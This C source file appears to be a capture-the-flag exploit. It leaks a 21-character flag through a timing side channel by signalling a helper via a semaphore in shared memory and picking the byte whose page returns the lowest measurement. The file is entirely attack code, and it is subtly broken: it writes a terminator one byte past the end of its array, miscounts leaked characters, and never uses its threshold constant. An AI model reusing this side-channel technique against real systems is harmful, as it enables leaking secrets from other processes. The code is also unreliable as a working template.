#define _GNU_SOURCE

#include <unistd.h>
#include <x86intrin.h>
#include <inttypes.h>
#include <stdio.h>
#include <semaphore.h>
#include <sched.h>
#include <string.h>

#define PAGE_SIZE 0x1000
#define FLAG_LEN 21
#define TIMING_THRESHOLD 230

int main() {
  char *shared_mem_base = (char *) 0x1337000;
  sem_t *sem = (sem_t *) (shared_mem_base);
  int *index = (int *) (sem + 1);
  int leaked_chars = 0;

  char flag_val[FLAG_LEN];
  memset(flag_val, ' ', FLAG_LEN);
  flag_val[FLAG_LEN] = '\x00';

  while (leaked_chars < FLAG_LEN) {
    for (int i = 0; i < FLAG_LEN; i++) {
      uint64_t min_val = 100000;
      *index = i;
      sem_post(sem);
      for (int c = 0; c < 256; c++) {
        uint64_t *page = (uint64_t *) (shared_mem_base + c * 0x1000 + 0x1000);
        if (*page < min_val) {
          min_val = *page;
	  flag_val[i] = c;
	  leaked_chars++;
        }
      }
    printf("Flag Value: %s\n", flag_val);
    }
  }
}
